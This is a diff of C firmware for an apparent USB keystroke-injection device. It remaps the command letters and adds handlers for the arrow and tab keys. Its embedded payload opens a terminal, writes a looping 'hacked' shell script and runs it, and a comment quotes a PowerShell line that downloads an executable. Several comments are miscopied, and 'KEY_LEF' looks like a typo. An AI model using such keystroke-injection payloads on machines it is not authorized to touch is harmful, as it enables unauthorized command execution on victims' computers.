@@ -38,11 +38,10 @@
  */
 
 #include "config.h"
+#include "keyboard_payload.h"
 
 #ifdef CONSOLE_DEBUG
 #include <stdio.h>
-#else
-#include "keyboard_payload.h"
 #endif
 
 /**
@@ -57,10 +56,20 @@
  * $client = New-Object System.Net.WebClient
  * $client.DownloadFile("http://www.example.com/file.exe", "C:\")
  */
-char *str = "K: ALT F2\nW: 500\nS: konsole\nR\nW: 500\nS: echo '#!/bin/sh'>hacked.sh\nR\nS: echo 'while :; do echo \"Hacked or so :))\";done'>>hacked.sh\n\nRS: sh hacked.sh &\nR\0";
+char *str = "K: ALT F2\n\
+W 500\n\
+S konsole\n\
+E\n\
+W 500\n\
+S echo '#!/bin/sh'>hacked.sh\n\
+E\n\
+S echo 'while :; do echo \"Hacked or so :))\";done'>>hacked.sh\n\
+E\n\
+S sh hacked.sh &\n\
+E\0";
 
 /**
- * 
+ * Keys to send as Keystrokes
  */
 int press_key = 0, press_modifier = 0;
 
@@ -73,19 +82,30 @@ void parse_char(char *str);
 
 /**
  * Parse the line and check for the following commands:
- * -> K: MODIFIER KEY
- * -> S: STRING TO SEND
- * -> W: 100
+ * -> K MODIFIER KEY
+ * -> S STRING TO SEND
+ * -> W 100
+ * -> X
  * -> E
+ * -> T
+ * -> U
+ * -> D
+ * -> L
  * -> R
  * 
  * The "K" is used to simulate a KeyStroke with a modifier key
  * The "S" is used to write a string
  * The "W" is used to wait the given amount of milliseconds before the next line is processed
- * The "E" sends an ESC keystroke
- * The "R" sends a RETURN keystroke
+ * The "X" sends an ESC keystroke
+ * The "E" sends a RETURN keystroke
+ * The "T" sends a TAB keystroke
+ * The "U" sends a UP keystroke
+ * The "D" sends a DOWN keystroke
+ * The "L" sends a LEF keystroke
+ * The "R" sends a RIGHT keystroke
  * 
  * All spaces are removed between the command sequence and the first character
+ * For better readability you can use an optional doublepoint after the command char
  * 
  * @param *str Pointer to the CharArray to send
  */
@@ -98,6 +118,7 @@ void parse_command_lines(char *str);
 int main(void) {
 	int i;
 	
+#ifndef CONSOLE_DEBUG
 	// Set for 16 MHz clock, configure the LED and turn it off
 	CPU_PRESCALE(0);
 	LED_CONFIG;
@@ -118,6 +139,7 @@ int main(void) {
 		LED_OFF;
 		_delay_ms(100);
 	}
+#endif
 	
 	// Parse the above defined command
 	parse_command_lines(str);
@@ -260,13 +282,14 @@ void parse_command_lines(char *str) {
 #endif
 			break;
 			
-		case 'E':
-		case 'e':
+		case 'X':
+		case 'x':
 			// Read until the end of the line and press the ESCAPE key
+			chr = *send;
 			while (1) {
-				chr = *(send++);
 				if (chr == '\0') break;
 				if (chr == '\n') break;
+				chr = *(send++);
 			}
 #ifdef CONSOLE_DEBUG
 			printf("> sending ESCAPE\n");
@@ -275,18 +298,99 @@ void parse_command_lines(char *str) {
 #endif
 			break;
 			
-		case 'R':
-		case 'r':
+		case 'E':
+		case 'e':
 			// Read until the end of the line and press the RETURN key
+			chr = *send;
 			while (1) {
-				chr = *(send++);
 				if (chr == '\0') break;
 				if (chr == '\n') break;
+				chr = *(send++);
 			}
 #ifdef CONSOLE_DEBUG
 			printf("> sending ENTER\n");
 #else
 			usb_keyboard_press(KEY_ENTER, KEY_NONE);
+#endif
+			break;
+			
+		case 'T':
+		case 't':
+			// Read until the end of the line and press the TABULATOR key
+			chr = *send;
+			while (1) {
+				if (chr == '\0') break;
+				if (chr == '\n') break;
+				chr = *(send++);
+			}
+#ifdef CONSOLE_DEBUG
+			printf("> sending TAB\n");
+#else
+			usb_keyboard_press(KEY_TAB, KEY_NONE);
+#endif
+			break;
+			
+		case 'U':
+		case 'u':
+			// Read until the end of the line and press the TABULATOR key
+			chr = *send;
+			while (1) {
+				if (chr == '\0') break;
+				if (chr == '\n') break;
+				chr = *(send++);
+			}
+#ifdef CONSOLE_DEBUG
+			printf("> sending UP\n");
+#else
+			usb_keyboard_press(KEY_UP, KEY_NONE);
+#endif
+			break;
+			
+		case 'D':
+		case 'd':
+			// Read until the end of the line and press the TABULATOR key
+			chr = *send;
+			while (1) {
+				if (chr == '\0') break;
+				if (chr == '\n') break;
+				chr = *(send++);
+			}
+#ifdef CONSOLE_DEBUG
+			printf("> sending DOWN\n");
+#else
+			usb_keyboard_press(KEY_DOWN, KEY_NONE);
+#endif
+			break;
+			
+		case 'L':
+		case 'l':
+			// Read until the end of the line and press the TABULATOR key
+			chr = *send;
+			while (1) {
+				if (chr == '\0') break;
+				if (chr == '\n') break;
+				chr = *(send++);
+			}
+#ifdef CONSOLE_DEBUG
+			printf("> sending LEFT\n");
+#else
+			usb_keyboard_press(KEY_LEF, KEY_NONE);
+#endif
+			break;
+			
+		case 'R':
+		case 'r':
+			// Read until the end of the line and press the TABULATOR key
+			chr = *send;
+			while (1) {
+				if (chr == '\0') break;
+				if (chr == '\n') break;
+				chr = *(send++);
+			}
+#ifdef CONSOLE_DEBUG
+			printf("> sending RIGHT\n");
+#else
+			usb_keyboard_press(KEY_RIGHT, KEY_NONE);
 #endif
 			break;
 	}
